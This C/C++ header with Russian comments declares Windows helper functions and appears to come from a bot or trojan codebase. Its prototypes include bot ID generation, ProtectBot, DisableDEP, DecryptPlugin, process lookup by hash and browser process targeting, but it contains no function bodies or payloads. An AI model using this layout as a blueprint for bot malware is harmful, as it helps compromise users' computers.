
#ifndef UtilsH
#define UtilsH
//----------------------------------------------------------------------------

#include <windows.h>


#define WIN_2000	1
#define WIN_XP		2
#define WIN_2003	3
#define WIN_VISTA	4
#define WIN_7		5


DWORD GetProcessIdByHash( DWORD dwHash );
//возвращает хеш процесса по пиду
DWORD GetProcessHashOfId(DWORD dwPid);
char *GetProcessList();

HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param );
HANDLE OpenProcessEx( DWORD dwHash );
void GetUserToken();

bool RunFile( WCHAR *Path );
bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread );
bool MakeUpdate( WCHAR *FileName );


char * FileToMD5(char *URL);

void GenerateUid( char *BotUid );

char *GetOSInfo();
LPVOID GetInfoTable( DWORD dwTableType );
void GetOSVersion();

HANDLE CreateUpdateMutex();
DWORD GetCurrentSessionId();

DWORD WINAPI LoadDll( LPVOID lpData );
DWORD GetFileHash( WCHAR *File );
bool GodmodeOnFile( WCHAR *Filename );


void DisableDEP();
DWORD GetProcessHash();

void ProtectBot();
void UnProtectBot();

LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize );
LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen );

// Функция возвращает идентификатор процесса эксплорера (Explorer.exe)
DWORD GetExplorerPid();
// Функция возвращает идентификатор процесса эксплорера (iexplore.exe)
DWORD GetIExplorerPid();

#define Min(a,b) (((a) < (b)) ? (a) : (b))
#define Max(a,b) (((a) > (b)) ? (a) : (b))



//****************************************************************************
//  Random  методы для генирации случайных чисел
//****************************************************************************
namespace Random
{
	// Инициализировать генератор случайных чисел
	void Initialize();

	// Генерировать случайное число
	DWORD Generate();

	// Генерировать случайное число в диапазоне от Min до Max
	DWORD Generate(DWORD Min, DWORD Max);

	// Генерировать строку случайных символов
	// Min, Max - диапазон генерации символов
	PCHAR RandomString(DWORD Length, char Min, char Max);
}



//******************************************************************
//  GenerateBotID - Функция генерирует идентификатор бота
//
//  Результат - Строка созданная функцией StrNew. Уничтожить
//              функцией StrFree
//******************************************************************
PCHAR GenerateBotID();

//******************************************************************
//  DirExists - Функция возвращает истину если путь  Path ceotcndetn
//******************************************************************
bool DirExists(PCHAR Path);


//******************************************************************
//  FileExists* - Функция возвращает истину если файл  FileName
//  			  существует
//******************************************************************
bool FileExistsA(PCHAR FileName);
bool FileExistsW(PWCHAR FileName);
//проверяют наличие файла по флагу типа CSIDL_APPDATA+FileName или с куском пути folder\file.dlll
bool isFileExists(int FlagFolderDest, WCHAR*Path);
//проверяют наличие файла по флагу типа CSIDL_APPDATA+FileName или с куском пути folder\file.dlll
// то что дальше будет
bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count);
//проверяют наличие файла по флагу типа CSIDL_APPDATA+FileName возвращает его данные
bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count);

//----------------------------------------------------------------------------
// Функции поиска файлов и директорий
//----------------------------------------------------------------------------

typedef  LPWIN32_FIND_DATA PFindData;

typedef void (* TFilesCallBack)(PFindData Search, // Структура поиска
								PCHAR FileName,   // Имя найденного файла
								LPVOID Data,      // Данные переданные в функцию поиска
								bool &Cancel      // Указание прервать дальнейший поиск
								);

#define FA_ANY_FILES ( FILE_ATTRIBUTE_READONLY |\
					   FILE_ATTRIBUTE_HIDDEN   |\
					   FILE_ATTRIBUTE_SYSTEM   |\
					   FILE_ATTRIBUTE_ARCHIVE)

#define FA_DIRECTORY FILE_ATTRIBUTE_DIRECTORY

//******************************************************************
//  SearchFiles  - Функция перебирает все  поддиректории
//
//  Path - Пусть с которого начинается поиск. Должен заканчиваться
//         обратным слешем \\
//  Mask - Маска поиска. *.* для всех файлов
//
//  Recursive - Производить рекурсивный поиск
//
//  FileAttributes - Атрибуты искомых файлов
//
//  Data - Данные которые будут переданы в метод обратной связи
//
//  CallBack - метод обратной связи
//
//  Результат - Функция возвращает истину если поиск не был прерван
//              из метода обратной связи
//
//******************************************************************
bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
				 LPVOID Data, TFilesCallBack CallBack);


//******************************************************************
//  GetUniquePID - Функция возвращает реальный идентификатор
//	   текущего процесса. Отличие от GetProcessID() в том, что
//     возвращает корректное значение для дочерних процессов
//******************************************************************
DWORD GetUniquePID();


//******************************************************************
//  IsNewProcess - Функция проверяет идентификатор текущего
//		процесса со значением ProcessID и возвращает истину если
//		они отличаются. В случае отличия значение ProcessID
//      переприсвается
//******************************************************************
bool IsNewProcess(DWORD &ProcessID);


//----------------------------------------------------------------------------
// Registry - методы для работы с реестром Windows
//----------------------------------------------------------------------------

namespace Registry
{
	// создать раздел в реестре пример CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
	bool CreateKey(HKEY h, char* path, char* name );
	//корневой ключ, путь без ключа, имя создаваемого значения, значение(заменяет значение REG_SZ)
	bool SetValueString(HKEY h, char* path, char* name,  char* values );
	//корневой ключ, путь без ключа, имя создаваемого значения, значение(создает заменяет значение DWORD)
	bool SetValueDWORD(HKEY h, char* path, char* name,  DWORD values );

	// Функция получает строковое значение из реестра
    PCHAR GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value);

	//корневой ключ, путь без ключа, имя создаваемого значения, значение(создает заменяет значение REG_SZ)
	bool CreateValueString(HKEY h, char* path, char* name,  char* values );
	bool CreateValueREGMULTI_SZ(HKEY h, char* path, char* name,  char* values,DWORD sise );
}

//----------------------------------------------------------------------------
// FILE - методы для работы с файлами, именами файлов
//----------------------------------------------------------------------------

namespace File
{
	// Записать данные из буфера в файл
	DWORD WriteBufferA(PCHAR FileName, LPVOID Buffer, DWORD BufferSize);
	DWORD WriteBufferW(PWCHAR FileName, LPVOID Buffer, DWORD BufferSize);

	// Прочитать файл в буфер
	LPBYTE ReadToBufferA(PCHAR FileName, DWORD &BufferSize);
	LPBYTE ReadToBufferW(PWCHAR FileName, DWORD &BufferSize);

	// Изменить расширение файла. Касается только строки FileName!!!
	// Примечание - Расширение меняется вместе с точкой
	// Результат - НОВАЯ строка с именем файла
	PCHAR ChangeFileExt(PCHAR FileName, PCHAR Ext);

	// Функции получения имён временных файлов
	PCHAR GetTempNameA();

	//-------------------------------------------------------------------------
	//  Функции извлекают имя файла из полного пути
	//  FileName - полное имя файла, если не содержит разделителей / либо \\
	//  	то функция вернёт всю строку
	//  DuplicateStr - Установить в истину, если необходимо создать
	//		новую строку из результата. В случае false функция вернёт указатель
	//      на первый символ имени в исходной строке
	//-------------------------------------------------------------------------
	PCHAR ExtractFileNameA(PCHAR FileName, bool DuplicateStr);
	PWCHAR ExtractFileNameW(PWCHAR FileName, bool DuplicateStr);

	//-------------------------------------------------------------------------
	//  ExtractFilePath - функция извлекает имя файла из его полного имени
	//
	//	Результат: В случае успеха функция возвращает новую строку содержащую
	//             путь к файлу
	//-------------------------------------------------------------------------
	PCHAR ExtractFilePathA(PCHAR FileName);
	//-------------------------------------------------------------------------
	//BOOL isFileExist(CHAR* filename);

}

//**********************************************************************
//  EnumDrives - Функция перебирает все диски указанного типа
//               используйте DRIVE_UNKNOWN для перебора всех
//               дисков в системе
//**********************************************************************
typedef void (*TEnumDrivesMethod)(PCHAR Drive, LPVOID Data, bool &Cancel8);

void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data);


//-----------------------------------------------------------------------------
//  IsExecutableFile - ыункция возвращает истину если указанный буфер является
//					   исполняемым файлом, либо dll
//-----------------------------------------------------------------------------
bool IsExecutableFile(LPVOID Buf);


// функция добавлена при добавлении оперы
char *CalcFileMD5Hash(char *szFileName);

char *GetWndText( HWND hWnd );
char *GetNetInfo();
DWORD GetFileFormat( WCHAR *lpFileName );
void MakeShutdown();
BOOL KillProcess(DWORD pid,DWORD TimeOut );

//----------------------------------------------------------------------------
#endif
